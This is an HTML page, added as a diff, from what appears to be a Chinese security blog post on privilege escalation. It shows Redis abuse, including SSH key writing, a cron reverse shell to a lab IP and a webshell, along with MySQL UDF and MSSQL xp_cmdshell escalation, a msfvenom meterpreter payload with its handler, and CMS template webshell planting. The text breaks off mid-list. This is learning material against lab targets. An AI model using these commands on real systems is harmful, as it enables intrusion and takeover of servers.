@@ -1,0 +1,1205 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D4wn">
+  <meta name="keywords" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
+  
+    <meta name="description" content="权限提升 写在最前 本文参考了小迪安全，Freebuf，先知社区以及众多个人博客，涉及了提权基础知识和Windows的常见提权方法，未涉及Linux以及域的知识。 在学习提权之前，我们有必要来了解一下常见的权限有哪些。  后台权限 所谓的后台权限，就是通过弱口令，SQL注入等手段进入网站的后台。在此权限下，能够执行后台的一些功能，比如发布文章，但是执行的功能也仅仅局限于后台。 数据库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升">
+<meta property="og:url" content="https://d4wnnn.github.io/2023/07/23/Security/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="D4wn">
+<meta property="og:description" content="权限提升 写在最前 本文参考了小迪安全，Freebuf，先知社区以及众多个人博客，涉及了提权基础知识和Windows的常见提权方法，未涉及Linux以及域的知识。 在学习提权之前，我们有必要来了解一下常见的权限有哪些。  后台权限 所谓的后台权限，就是通过弱口令，SQL注入等手段进入网站的后台。在此权限下，能够执行后台的一些功能，比如发布文章，但是执行的功能也仅仅局限于后台。 数据库">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://source.unsplash.com/user/erondu/1600x900">
+<meta property="article:published_time" content="2023-07-23T13:19:35.000Z">
+<meta property="article:modified_time" content="2023-07-30T11:17:58.922Z">
+<meta property="article:author" content="D4wn">
+<meta property="article:tag" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://source.unsplash.com/user/erondu/1600x900">
+  
+  
+  
+  <title>权限提升 - D4wn</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"d4wnnn.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"104d1c240fe4777ab966bd68252f7714","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?104d1c240fe4777ab966bd68252f7714";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>D4wn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/total.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="权限提升"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        D4wn
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-23 21:19" pubdate>
+          2023年7月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          34 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">权限提升</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="权限提升">权限提升</h1>
+<h2 id="写在最前">写在最前</h2>
+<p>本文参考了小迪安全，Freebuf，先知社区以及众多个人博客，涉及了提权基础知识和Windows的常见提权方法，未涉及Linux以及域的知识。</p>
+<p>在学习提权之前，我们有必要来了解一下常见的权限有哪些。</p>
+<ul>
+<li><p>后台权限
+所谓的后台权限，就是通过<code>弱口令</code>，<code>SQL注入</code>等手段进入网站的后台。在此权限下，能够执行<code>后台的一些功能</code>，比如发布文章，但是执行的功能也仅仅局限于后台。</p></li>
+<li><p>数据库权限
+一般通过<code>弱口令</code>或<code>注入</code>得到，在此权限下，可以对数据库文件进行修改。</p></li>
+<li><p>普通权限</p>
+<p>包括网站权限和普通的用户权限。</p>
+<p>网站权限就是我们通常获得的Shell，常常通过一些RCE或文件上传，文件包含，反序列化等手段直达Shell。在此权限下，我们可以更改网站的<code>源代码</code>或<code>配置文件</code>，也能收集到操作系统的相关信息。</p>
+<p>用户权限要比网站权限更高一些。</p></li>
+<li><p>System权限
+要么通过高危的系统漏洞，要么通过网站权限等提权得到。在此权限下，就相当于操作自己的电脑。</p></li>
+</ul>
+<p>​ 在Windows中，System权限是最高权限，相当于Linux里面的root。</p>
+<h2 id="一数据库提权">一、数据库提权</h2>
+<h3 id="redis">1.1 Redis</h3>
+<h4 id="写入ssh公钥">1.1.1 写入SSH公钥</h4>
+<p>实战: 从数据库权限到Web权限
+现在我们有某个Redis的访问权限，目标权限是Web权限。
+Redis是一个基于键值对的NoSQL数据库, 比如set name
+"qy"就设立了一个键为name值为qy的数据,此时数据是保存在内存中的,并没有保存在硬盘内,可以调用save命令使数据持久化。
+首先通过<code>redis-cli -h 192.168.126.144</code>连接Redis服务器
+然后执行以下命令写入你的公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-built_in">set</span> qy <span class="hljs-string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBe/UsMlJRIL+Z4w0DTr9nRmKu8Tt9cPoKj/t7fOHWItBPxMaVryrq732nIkZlCrtpJNkZJsfN9Fq2oGHyA/x3qrXBjhNiFUx2NTRHPlcfVMfTf+XB34oa4eAHOEWpkxCDZe+W0nV3va8sp7poSQqA+GD+YmidZ8dR57TQdfnTTFB9SIW7DZBATRseUzf/PtPRTVh7Jn/963M/JHVhV+OHXJ0BRCvu0YBg/oqxPkWJ41kZOZJP6KfDVICgoERgULRdnYWLNUUNlLOQ4LPDG3fhQHJgN2L9hqjf0bk5Zx5ZA9Uy093AAdkyElY2rkxeN9hwOZT/YFEbvUAT0v2kDtf1TM8lfuO3ibD2j9Pxetv/jUKNthliSmdeB/+tD6hkJ6/mdjvoIgqATY2YlEIM7YYTAZ4mVaqAbYKx3HHDRlj7Jd2wUEGuOFcuzvqIsIHTfSzcydvUBW04zLUKAl/Zacp0mi+wmbgyX3gZYO6nhFCjmQPaO2KyNLrArYepWifDnlk= d4wn@D4wn\n\n\n"</span><br>save<br></code></pre></td></tr></table></figure>
+<p>执行过程如下 <img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725161846486.png" srcset="/img/loading.gif" lazyload>
+写入后即可通过SSH获取Web权限</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725162045475.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="定时任务反弹shell">1.1.2 定时任务反弹Shell</h4>
+<p>crontab是Linux中执行周期任务的命令，如果我们将反弹Shell的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron<br>config <span class="hljs-built_in">set</span> dbfilename root <span class="hljs-comment">#必须是root</span><br><span class="hljs-built_in">set</span> qy  <span class="hljs-string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"</span><br>save<br></code></pre></td></tr></table></figure>
+<h4 id="写入webshell">1.1.3 写入Webshell</h4>
+<p>前提条件:</p>
+<ol type="1">
+<li>知道网站的目录</li>
+<li>目录具有读写权限</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html<br>config <span class="hljs-built_in">set</span> dbfilename 1.php<br><span class="hljs-built_in">set</span> qy <span class="hljs-string">"&lt;?php phpinfo();?&gt;"</span><br>save <span class="hljs-comment"># 保存执行</span><br>注意:部分目录没有读写权限<br></code></pre></td></tr></table></figure>
+<h3 id="mysql">1.2 MySQL</h3>
+<ul>
+<li>MySQL提权有两个前提条件
+<ul>
+<li>有数据库最高权限用户的密码</li>
+<li>secure-file-priv没有设置</li>
+</ul></li>
+<li>获取最高权限用户密码的途径？
+<ul>
+<li>数据库配置文件(比如config.php)(演示-熊海CMS)</li>
+<li>高权限的SQL注入点</li>
+<li>数据库的存储文件或者备份文件(比如MYI文件)</li>
+</ul></li>
+</ul>
+<h4 id="udf提权">1.2.1 UDF提权</h4>
+<p>前提条件:</p>
+<ol type="1">
+<li>知道root用户的密码</li>
+<li>secure-file-priv设置为空字符串</li>
+</ol>
+<p>UDF(User Define
+Function)，指的是用户在数据库中自定义函数，在自定义函数时可以调用我们的恶意程序，进而实现提权。UDF提权时我们的恶意程序一般是dll文件，我们在生成这个dll文件后需要将其上传到指定的目录才能让UDF识别。值得注意的是，MySQL&lt;5.2时我们需要导出到c:/windows或者c:/system32；当MySQL≥5.2时，需要导出到安装目录下的/lib/plugin(若是phpstudy搭建的MySQL需要自己创建)。我们可以用<code>select version()</code>和<code>select @@basedir</code>分别查看MySQL版本和安装目录。
+接下来我们使用MSF进行UDF提权，但是，在开始之前，我们需要将MySQL开启外连，因为默认情况下，我们MySQL的root用户是不允许外部IP登录的，开启外连需要以下命令。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'帐号'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'密码'</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br></code></pre></td></tr></table></figure>
+<p>在开启外连后，我们用MSF就可以远程连接，向相关目录里注入dll文件，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use exploit/multi/mysql/mysql_udf_payload<br><span class="hljs-built_in">set</span> password root<br><span class="hljs-built_in">set</span> rhosts 192.168.126.150(靶机IP)<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230726184529948.png" srcset="/img/loading.gif" lazyload></p>
+<p>在命令执行完毕后，MSF会为我们创建函数<code>sys_exec</code>，但是此函数是没有回显的，我们需要但是我们已经得到的dll文件，我们可以根据dll文件创建具有回显的函数<code>sys_eval</code>，我们可以通过<code>select * from mysql.func;</code>来查看当前有哪些函数。
+创建<code>sys_eval</code>函数的命令如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">create <span class="hljs-keyword">function</span> sys_eval returns string soname <span class="hljs-string">"xxxxxx.dll"</span><br></code></pre></td></tr></table></figure>
+<p>接着，我们便可以利用<code>sys_eval</code>执行系统命令，相当于获得了一个User权限。</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230726185143603.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="启动项提权">1.2.2 启动项提权</h4>
+<p>MSF：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use exploit/windows/mysql/mysql_start_up<br><span class="hljs-built_in">set</span> rhosts 47.102.195.100<br><span class="hljs-built_in">set</span> username root<br><span class="hljs-built_in">set</span> password root<br>run<br></code></pre></td></tr></table></figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730165911859.png" srcset="/img/loading.gif" lazyload alt="image-20230730165911859">
+<figcaption aria-hidden="true">image-20230730165911859</figcaption>
+</figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730165821427.png" srcset="/img/loading.gif" lazyload alt="image-20230730165821427">
+<figcaption aria-hidden="true">image-20230730165821427</figcaption>
+</figure>
+<h4 id="mof提权">1.2.3 MOF提权</h4>
+<p>使用较少</p>
+<h4 id="反弹shell提权">1.2.4 反弹Shell提权</h4>
+<p>使用较少</p>
+<h3 id="mssql">1.3 MSSQL</h3>
+<h4 id="xp_cmdshell提权">1.3.1 xp_cmdshell提权</h4>
+<p>xp_cmdshell是一个存储过程(数据库课程会学到)，负责调用系统命令。在较高版本的
+SQLServer中默认关闭，我们可以通过如下命令进行打开。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span><br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>
+<p>打开后我们就可通过xp_cmdshell调用系统命令，此时的权限取决于SQLServer的运行权限。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">EXEC</span> master.dbo.xp_cmdshell <span class="hljs-string">'命令'</span>;<br></code></pre></td></tr></table></figure>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230727231202648.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="sp_oacreate提权">1.3.2 sp_oacreate提权</h4>
+<p>略</p>
+<h4 id="沙盒提权">1.3.3 沙盒提权</h4>
+<p>略</p>
+<h2 id="二后台提权">二、后台提权</h2>
+<h4 id="查询历史cms漏洞代码审计">2.1 查询历史CMS漏洞/代码审计</h4>
+<ul>
+<li><p>实战: 从后台权限提升到Web权限
+假设我们通过弱口令已经获得了某个网站的后台权限，后台地址如下
+http://192.168.126.144:8080/ofcms-admin/admin/index.html
+我们的目标是将其提升为Web权限。注意，本文忽略了文件上传，文件包含等基础知识，在学习权限提升时，可以不用关注这些细枝末节。
+要想根据后台权限获取Web权限，有两种思路。</p>
+<ol type="1">
+<li>若是CMS，寻找网络上CMS获Shell的相关漏洞。</li>
+<li>若不是CMS或者CMS无相关资料，自己拿后台功能想办法。
+这里我们选择第二种方法。
+在后台的"模板设置"模块，我们可以看到，这是一个更新index.html的功能。那么我们能否利用此功能将后门写进xxx.jsp呢？要知道，只写进后门是不够的，还需要能够解析，也就是后缀绝不能是html。
+我们发现"index.html"似乎不能更改，此时有两种思路绕过，一种是直接利用F12开发者模式修改标签对应的“value”属性，另一种是通过抓包修改，这里我们选择前者。
+(注意:
+这里的Shell代码是通过哥斯拉生成的，Shell路径也是通过白盒审计而来的，这两方面不在本文讨论范围内。我们只需对提权思路进行关注)
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230724022602778.png" srcset="/img/loading.gif" lazyload></li>
+</ol>
+<p>则可得到你的Shell地址</p>
+<p>http://192.168.126.144:8080/ofcms-admin/static/aaa.jsp 提权成功</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230724022955025.png" srcset="/img/loading.gif" lazyload></p></li>
+</ul>
+<h4 id="寻找特定功能">2.2 寻找特定功能</h4>
+<h2 id="三用户提权">三、用户提权</h2>
+<h3 id="用户--数据库">3.1 用户--&gt;数据库</h3>
+<ul>
+<li>实战: 从Web权限到数据库权限
+在前面，我们获得了OFCMS的Web权限，从Web权限到比较低层次的权限是相对而言容易跨越的。比如我们想获取数据库权限，只需在网站的源码中找到数据库的配置文件。
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230724024442597.png" srcset="/img/loading.gif" lazyload></li>
+<li><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230724024648424.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h3 id="用户--后台">3.2 用户--&gt;后台</h3>
+<p>假如我们通过其他方式直接获取到了Web权限，想得到后台权限，又该怎么操作呢？
+大致思路分为两种，一种是直接修改源码中的认证流程，另一种是获取数据库权限后添加对应的管理员账户或者解密密码。</p>
+<h3 id="用户--system">3.3 用户--&gt;System</h3>
+<h4 id="溢出漏洞">3.3.1 溢出漏洞</h4>
+<ul>
+<li>筛选漏洞项目推荐
+<ul>
+<li>https://github.com/vulmon/Vulmap</li>
+<li>https://github.com/bitsadmin/wesng</li>
+<li>https://github.com/chroblert/WindowsVulnScan</li>
+<li>https://github.com/nomi-sec/PoC-in-GitHub</li>
+</ul></li>
+<li>EXP下载网站推荐
+<ul>
+<li>https://github.com/k8gege/Ladon</li>
+<li>https://github.com/Ascotbe/KernelHub</li>
+<li>https://github.com/nomi-sec/PoC-in-GitHub
+注意，在一些项目中，有已经编译好的CVE，但是并不推荐使用，因为不同版本的Windows或者相同版本的Windows即使有一些微小的差异，也会造成提权失败。更加推荐一些安全团队编写的框架，因为其EXP通用性和健壮性更强。</li>
+</ul></li>
+</ul>
+<h5 id="手动">(1) 手动</h5>
+<ul>
+<li><p>步骤</p>
+<ul>
+<li>收集信息(系统版本，最常见的是2008/2012/2016/2019 补丁 杀软信息 位数
+网络 当前权限)</li>
+<li>基于信息筛选可利用漏洞</li>
+<li>上传EXP进行调用</li>
+</ul></li>
+<li><p>收集信息阶段常用到的命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Powershell">ver<br>systeminfo<br>netstat <span class="hljs-literal">-ano</span><br>tasklist /svc<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="半自动">(2) 半自动</h5>
+<ul>
+<li>除了手动进行提权，我们还可以利用MSF进行半自动提权。</li>
+<li>生成EXP, 上传到靶机</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.144 LPORT=8888 -f exe -o msf.exe<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>进入MSF，配置监听对话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 0.0.0.0<br><span class="hljs-built_in">set</span> lport 8888<br>run<br></code></pre></td></tr></table></figure>
+<p>然后调用靶机上的反弹程序，成功连接，通过命令<code>getuid</code>我们可以看到此时的权限是Administrator，我们的目标是获取System权限。</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725214708651.png" srcset="/img/loading.gif" lazyload></p></li>
+<li><p>输入<code>background</code>保存当前会话(记住这个会话号，后面会用到)，接下来我们去提权。输入如下命令让MSF自动筛选相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725215242747.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725215343942.png" srcset="/img/loading.gif" lazyload>
+根据上图，我们可以看到MSF为我们筛选出了部分可用漏洞，我们以<code>exploit/windows/local/cve_2021_40449</code>为例进行演示。</p></li>
+<li><p>提权
